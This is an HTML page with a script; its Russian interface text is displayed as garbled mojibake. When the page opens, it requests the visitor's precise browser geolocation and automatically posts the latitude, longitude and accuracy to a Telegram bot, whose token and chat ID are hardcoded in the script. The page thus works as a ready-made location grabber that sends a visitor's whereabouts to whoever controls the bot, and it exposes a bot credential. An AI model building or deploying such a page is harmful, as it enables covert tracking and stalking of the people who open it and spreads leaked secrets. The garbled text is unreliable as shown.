<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8" />
  <title>–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞ –≤ Telegram</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 40px;
      background: #222;
      color: #eee;
    }
    #status {
      margin-top: 30px;
      font-size: 18px;
      color: #4caf50;
    }
    #location {
      margin-top: 20px;
      font-size: 22px;
      color: #fff;
    }
  </style>
</head>
<body>

<h1>üìç –ü–æ–ª—É—á–µ–Ω–∏–µ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏</h1>
<div id="location">–ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ...</div>
<div id="status"></div>

<script>
const TELEGRAM_BOT_TOKEN = '7516763113:AAH2DOnREnv6aIFGRXCzPXndm4l1c3zXC7M';
const TELEGRAM_CHAT_ID = '526758225';

function sendToTelegram(message) {
  fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
      parse_mode: 'HTML'
    })
  }).then(() => {
    document.getElementById('status').textContent = '‚úÖ –ì–µ–æ–ª–æ–∫–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ Telegram.';
  }).catch(() => {
    document.getElementById('status').textContent = '‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram.';
  });
}

if ("geolocation" in navigator) {
  navigator.geolocation.getCurrentPosition((pos) => {
    const lat = pos.coords.latitude.toFixed(6);
    const lon = pos.coords.longitude.toFixed(6);
    const acc = pos.coords.accuracy.toFixed(1);

    const message = `–ù–æ–≤–∞—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏—è\\n–®–∏—Ä–æ—Ç–∞: ${lat}\\n–î–æ–ª–≥–æ—Ç–∞: ${lon}\\n–¢–æ—á–Ω–æ—Å—Ç—å: ${acc}–º`;

    document.getElementById('location').textContent = `üìç –®–∏—Ä–æ—Ç–∞: ${lat}, –î–æ–ª–≥–æ—Ç–∞: ${lon}, –¢–æ—á–Ω–æ—Å—Ç—å: ${acc} –º`;

    sendToTelegram(message);

  }, (err) => {
    document.getElementById('location').textContent = `–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: ${err.message}`;
  }, {
    enableHighAccuracy: true,
    timeout: 15000,
    maximumAge: 0
  });
} else {
  document.getElementById('location').textContent = '–ì–µ–æ–ª–æ–∫–∞—Ü–∏—è –Ω–µ –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ—Ç—Å—è –±—Ä–∞—É–∑–µ—Ä–æ–º.';
  document.getElementById('status').textContent = '';
}
</script>

</body>
</html>
